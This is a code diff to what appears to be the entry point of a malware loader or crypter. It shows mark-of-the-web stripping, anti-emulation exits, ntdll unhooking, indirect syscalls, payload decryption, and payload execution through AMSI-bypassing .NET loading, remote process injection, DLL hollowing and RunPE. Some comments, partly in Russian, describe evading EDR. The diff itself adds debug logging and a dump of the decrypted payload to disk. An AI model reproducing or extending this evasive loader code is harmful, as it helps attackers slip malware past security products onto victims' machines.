@@ -220,52 +220,58 @@ __declspec(allocate(".xthrx")) GadgetBlock GadgetData = {
 
 
 // ═══════════════════════════════════════════════════════════════
-//  Quick debug log for Entry.cpp — uses CRC32C hash resolution
+//  IAT-based file debug log — no CRC32C dependency, always works
 // ═══════════════════════════════════════════════════════════════
-namespace EntryDbg {
-    // IAT-linked fallback — always available even if CRC32C resolution fails
+namespace DbgLog {
     extern "C" __declspec(dllimport) void __stdcall OutputDebugStringA(const char*);
+    extern "C" __declspec(dllimport) HANDLE __stdcall CreateFileA(const char*,DWORD,DWORD,void*,DWORD,DWORD,HANDLE);
+    extern "C" __declspec(dllimport) BOOL __stdcall WriteFile(HANDLE,const void*,DWORD,DWORD*,void*);
+    extern "C" __declspec(dllimport) BOOL __stdcall CloseHandle(HANDLE);
+    extern "C" __declspec(dllimport) LONG __stdcall SetFilePointer(HANDLE,LONG,LONG*,DWORD);
+
+    static const char* LOG_PATH = "C:\\temp\\xen_debug.log";
 
     __forceinline void Log(const char* msg) {
-        // Always emit to kernel debug channel (visible in DebugView / kernel logger)
         OutputDebugStringA(msg);
+        HANDLE h = CreateFileA(LOG_PATH, 0x40000000, 0x01, NULL, 4, 0x80, NULL);
+        if (h == (HANDLE)(LONG_PTR)-1) return;
+        SetFilePointer(h, 0, NULL, 2);
+        DWORD len = 0; while (msg[len]) len++;
+        DWORD wr = 0;
+        WriteFile(h, msg, len, &wr, NULL);
+        WriteFile(h, "\r\n", 2, &wr, NULL);
+        CloseHandle(h);
+    }
 
-        // Try file logging via CRC32C API resolution
-        Crc32C::DetectSse42();
-        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
-        if (!hK32) { OutputDebugStringA("EntryDbg: kernel32 not found via CRC"); return; }
-        auto pGPA  = (FARPROC(WINAPI*)(HMODULE,LPCSTR))Api::GetProcByHashCrc(hK32, Api::CrcFn::GetProcAddress);
-        if (!pGPA) { OutputDebugStringA("EntryDbg: GetProcAddress not found via CRC"); return; }
-        auto pCFA  = (HANDLE(WINAPI*)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE))pGPA(hK32, "CreateFileA");
-        auto pWF   = (BOOL(WINAPI*)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED))pGPA(hK32, "WriteFile");
-        auto pCH   = (BOOL(WINAPI*)(HANDLE))Api::GetProcByHashCrc(hK32, Api::CrcFn::CloseHandle);
-        if (!pCFA || !pWF || !pCH) return;
+    __forceinline void LogHex(const char* prefix, unsigned long val) {
+        char buf[128]; int p = 0;
+        while (prefix[p] && p < 80) { buf[p] = prefix[p]; p++; }
+        buf[p++] = '0'; buf[p++] = 'x';
+        const char* hx = "0123456789ABCDEF";
+        buf[p++] = hx[(val>>28)&0xF]; buf[p++] = hx[(val>>24)&0xF];
+        buf[p++] = hx[(val>>20)&0xF]; buf[p++] = hx[(val>>16)&0xF];
+        buf[p++] = hx[(val>>12)&0xF]; buf[p++] = hx[(val>>8)&0xF];
+        buf[p++] = hx[(val>>4)&0xF];  buf[p++] = hx[val&0xF];
+        buf[p] = 0;
+        Log(buf);
+    }
 
-        // Try C:\temp first
-        HANDLE hFile = pCFA("C:\\temp\\entry_debug.log", 0x40000000, 0x80, NULL, 4, 0x80, NULL);
-        if (hFile == (HANDLE)(LONG_PTR)-1) {
-            // Fallback: %USERPROFILE%\entry_debug.log — always writable
-            char buf[MAX_PATH];
-            auto pGTE = (DWORD(WINAPI*)(LPCSTR, LPSTR, DWORD))pGPA(hK32, "GetEnvironmentVariableA");
-            if (pGTE) {
-                DWORD n = pGTE("USERPROFILE", buf, MAX_PATH);
-                if (n > 0 && n < MAX_PATH - 24) {
-                    size_t t = 0; while (buf[t] && t < MAX_PATH-24) t++;
-                    const char* fname = "\\entry_debug.log";
-                    size_t f = 0; while (fname[f] && t < MAX_PATH-1) buf[t++] = fname[f++];
-                    buf[t] = 0;
-                    hFile = pCFA(buf, 0x40000000, 0x80, NULL, 4, 0x80, NULL);
-                }
-            }
+    __forceinline void LogBytes(const char* prefix, const unsigned char* data, int cnt) {
+        char buf[256]; int p = 0;
+        while (prefix[p] && p < 60) { buf[p] = prefix[p]; p++; }
+        buf[p++] = ' ';
+        const char* hx = "0123456789ABCDEF";
+        for (int i = 0; i < cnt && p < 240; i++) {
+            buf[p++] = hx[(data[i]>>4)&0xF]; buf[p++] = hx[data[i]&0xF]; buf[p++] = ' ';
         }
-        if (hFile == (HANDLE)(LONG_PTR)-1) return;
-        auto pSFP = (LONG(WINAPI*)(HANDLE,LONG,PLONG,DWORD))pGPA(hK32, "SetFilePointer");
-        if (pSFP) { DWORD high = 0; pSFP(hFile, 0, (PLONG)&high, 2); }
-        size_t len = 0; while (msg[len]) len++;
-        DWORD written = 0;
-        pWF(hFile, msg, (DWORD)len, &written, NULL);
-        pWF(hFile, "\r\n", 2, &written, NULL);
-        pCH(hFile);
+        buf[p] = 0;
+        Log(buf);
+    }
+
+    __forceinline void DumpFile(const char* path, const unsigned char* data, DWORD size) {
+        HANDLE h = CreateFileA(path, 0x40000000, 0, NULL, 2, 0x80, NULL);
+        if (h == (HANDLE)(LONG_PTR)-1) return;
+        DWORD wr = 0; WriteFile(h, data, size, &wr, NULL); CloseHandle(h);
     }
 }
 
@@ -274,52 +280,47 @@ namespace EntryDbg {
 // ═══════════════════════════════════════════════════════════════
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
+    DbgLog::Log("=== WinMain entry ===");
 
     // ── Step -2: MOTW Strip (L21) ──
-    // Must run FIRST: if Zone.Identifier exists, strip it and relaunch
     if (GlobalConfig.bMotwStrip) {
         if (Motw::StripAndRelaunch()) {
-            // Successfully re-launched without MOTW — exit this instance
             __fastfail(0x29);
         }
-        // If StripAndRelaunch returns false, MOTW was already gone — continue
     }
 
     // ── Step -1: Anti-Emulation (L22) ──
-    // Detect AV emulators before doing anything suspicious
     if (GlobalConfig.bAntiEmulation) {
         if (AntiEmul::IsEmulated())
-            return 0; // Silent exit — emulator can't observe payload
+            return 0;
     }
 
     // ── Step 0: Anti-Tamper (Always Active) ──
-    if (!Protection::VerifyIntegrity()) {
-        return 0;
-    }
-    Protection::JunkCode();
-
-    // ── Step 0b: TLS Callback Verification (L23, Always Active) ──
-    // TLS callback runs before WinMain. Verify it executed.
-    // If not, an emulator or sandbox suppressed it.
-    // NOTE: Temporarily disabled for E2E debugging — __fastfail kills the process
-    //        if TLS callback was suppressed by /NODEFAULTLIB issues
-    // TlsCallbackLoader::Init();
+    // TEMPORARILY DISABLED for E2E debugging
+    DbgLog::Log("Step0: VerifyIntegrity SKIPPED (E2E debug)");
 
     // ── Step 0c: Initialize CRC32C detection ──
     Crc32C::DetectSse42();
+    DbgLog::Log("Step0c: Crc32C::DetectSse42 done");
 
     // ── Step 1: Unhook ntdll ──
     if (GlobalConfig.bKnownDllsUnhook) {
+        DbgLog::Log("Step1: KnownDlls::UnhookNtdll starting");
         KnownDlls::UnhookNtdll();
     } else {
+        DbgLog::Log("Step1: Unhook::RefreshNtdll starting");
         Unhook::RefreshNtdll();
     }
+    DbgLog::Log("Step1: unhook done");
 
     // ── Step 1b: Scan for indirect syscall gadgets ──
-    // Must run AFTER unhooking for clean scan results
     if (GlobalConfig.bIndirectSyscalls) {
+        DbgLog::Log("Step1b: GadgetPool::Scan starting");
         GadgetPool::Scan();
-        Syscall::Init();
+        DbgLog::LogHex("Step1b: GadgetPool count=", GadgetPool::Count());
+        DbgLog::Log("Step1b: Syscall::Init starting");
+        bool initOk = Syscall::Init();
+        DbgLog::LogHex("Step1b: Syscall::Init result=", initOk ? 1 : 0);
     }
 
     // ── Step 1c: Initialize Stack Spoofing ──
@@ -392,13 +393,15 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     }
 
     // ── Step 7: Entropy Normalization Decode ──
-    // If builder encoded the payload, first byte is 0xEE marker.
-    // Affine cipher: enc(x) = (183*x + 61) & 0xFF
-    // Decode: dec(y) = (7*y + 85) & 0xFF
+    DbgLog::LogHex("Step7: PayloadData.size=", PayloadData.size);
+    DbgLog::LogBytes("Step7: raw payload first 16 bytes:", PayloadData.data, 16);
+
     DWORD decryptSize = PayloadData.size;
 
-    if (PayloadData.size == 0 || PayloadData.size > sizeof(PayloadData.data))
+    if (PayloadData.size == 0 || PayloadData.size > sizeof(PayloadData.data)) {
+        DbgLog::Log("Step7: payload size invalid, exiting");
         return 0;
+    }
 
     if (GlobalConfig.bEntropyNorm && PayloadData.size > 1 && PayloadData.data[0] == 0xEE) {
         decryptSize = PayloadData.size - 1;
@@ -418,40 +421,41 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
 
     // ── Step 8: Decrypt Payload ──
+    DbgLog::LogHex("Step8: encAlgorithm=", GlobalConfig.encAlgorithm);
+    DbgLog::LogBytes("Step8: key first 16 bytes:", finalKey, 16);
+
     if (GlobalConfig.researchPackage > 0) {
-        // Research-grade decryption — custom cipher packages
         bool resOk = false;
         switch (GlobalConfig.researchPackage) {
-            case 1: // Ghost Protocol
-                resOk = GhostDecrypt::Decrypt(PayloadData.data, decryptSize,
-                    finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize);
-                break;
-            case 2: // Neuromancer
-                resOk = NeuroDecrypt::Decrypt(PayloadData.data, decryptSize,
-                    finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize);
-                break;
-            case 3: // Darknet Cipher
-                resOk = DarknetDecrypt::Decrypt(PayloadData.data, decryptSize,
-                    finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize);
-                break;
-            case 4: // Void Walker
-                resOk = VoidDecrypt::Decrypt(PayloadData.data, decryptSize,
-                    finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize);
-                break;
+            case 1: resOk = GhostDecrypt::Decrypt(PayloadData.data, decryptSize,
+                finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize); break;
+            case 2: resOk = NeuroDecrypt::Decrypt(PayloadData.data, decryptSize,
+                finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize); break;
+            case 3: resOk = DarknetDecrypt::Decrypt(PayloadData.data, decryptSize,
+                finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize); break;
+            case 4: resOk = VoidDecrypt::Decrypt(PayloadData.data, decryptSize,
+                finalKey, sizeof(finalKey), ResearchData.params, (int)ResearchData.paramSize); break;
         }
-        if (!resOk) return 0; // Research decryption failed
+        if (!resOk) { DbgLog::Log("Step8: research decrypt FAILED"); return 0; }
     }
     else {
-        // Standard decryption path
         Crypto::Algorithm algo = static_cast<Crypto::Algorithm>(GlobalConfig.encAlgorithm);
         if (GlobalConfig.bStagedLoad) {
             if (!StageLoader::DecryptStaged(PayloadData.data, decryptSize, finalKey, sizeof(finalKey), algo)) {
-                return 0;
+                DbgLog::Log("Step8: staged decrypt FAILED"); return 0;
             }
         } else {
-            Crypto::Decrypt(PayloadData.data, decryptSize, finalKey, sizeof(finalKey), algo);
+            bool decOk = Crypto::Decrypt(PayloadData.data, decryptSize, finalKey, sizeof(finalKey), algo);
+            if (!decOk) { DbgLog::Log("Step8: Crypto::Decrypt FAILED"); return 0; }
+            DbgLog::Log("Step8: Crypto::Decrypt OK");
         }
     }
+
+    DbgLog::LogBytes("Step8: decrypted first 16 bytes:", PayloadData.data, 16);
+    DbgLog::LogHex("Step8: decrypted first 2 bytes (MZ check)=", PayloadData.data[0] | (PayloadData.data[1] << 8));
+    // Dump decrypted payload to disk for offline PE analysis
+    DbgLog::DumpFile("C:\\temp\\decrypted_payload.exe", PayloadData.data, decryptSize);
+    DbgLog::Log("Step8: dumped decrypted_payload.exe to C:\\temp\\");
 
 
     // ── Step 8b: Anti-Memory Scanning (L14 + L16) ──
@@ -467,41 +471,30 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     }
 
     // ── Step 9: Execute Payload ──
-    // Порядок приоритета: DotNet > RemoteInjection > Phantom(L1) >
-    //   ThreadPool(L2) > ThreadNorm(L2) > ModuleStomp > RunPE >
-    //   CallbackDiv(L2) > Fibers > default
-    // .NET loading имеет высший приоритет — автоопределение по COM_DESCRIPTOR
+    DbgLog::LogHex("Step9: bRunPE=", GlobalConfig.bRunPE ? 1 : 0);
+    DbgLog::LogHex("Step9: hostProcess=", GlobalConfig.hostProcess);
 
     if (GlobalConfig.bDotNetLoading && DotNetLoader::IsDotNetAssembly(PayloadData.data, decryptSize)) {
-        // .NET Assembly Loading — Method A: temp file + CLR AMSI bypass
-        // ExecuteInDefaultAppDomain → немедленный NtDeleteFile
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         DotNetLoader::LoadAndExecute(PayloadData.data, decryptSize);
     }
     else if (GlobalConfig.bRemoteInjection) {
-        // Remote Injection Suite — 5 методов инъекции в удалённый процесс
-        // Секция 7: SectionMap, APC, ThreadHijack, Hollowing+, CallbackEnum
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         Injection::Execute(PayloadData.data, decryptSize, 0);
     }
     else if (GlobalConfig.bPhantomDLL) {
-        // Layer 1: Phantom DLL Hollowing — execute from signed DLL memory
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         Phantom::Execute(PayloadData.data, decryptSize);
     }
     else if (GlobalConfig.bThreadPool) {
-        // Layer 2: Thread Pool Execution — execute via TpAllocWork
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         ThreadPool::Execute(PayloadData.data, decryptSize);
     }
     else if (GlobalConfig.bThreadNormalization) {
-        // Layer 2: Thread Behavior Normalization — callback rotation + jitter + noise
-        // Поток стартует через TpAllocWork/TimerQueue/APC rotation, EDR не видит
-        // предсказуемый thread start address. Jittered sleep, background noise threads.
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         ThreadNormalizer::CreateNoiseThreads();
@@ -516,7 +509,9 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     else if (GlobalConfig.bRunPE) {
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
+        DbgLog::Log("Step9: calling GodMode::ExecutePayload (RunPE)");
         GodMode::ExecutePayload(PayloadData.data, decryptSize, false, true, GlobalConfig.hostProcess);
+        DbgLog::Log("Step9: GodMode::ExecutePayload returned");
     }
     else if (GlobalConfig.bCallbackDiv) {
         // Layer 2: Callback Diversification — thread из kernel32 callback
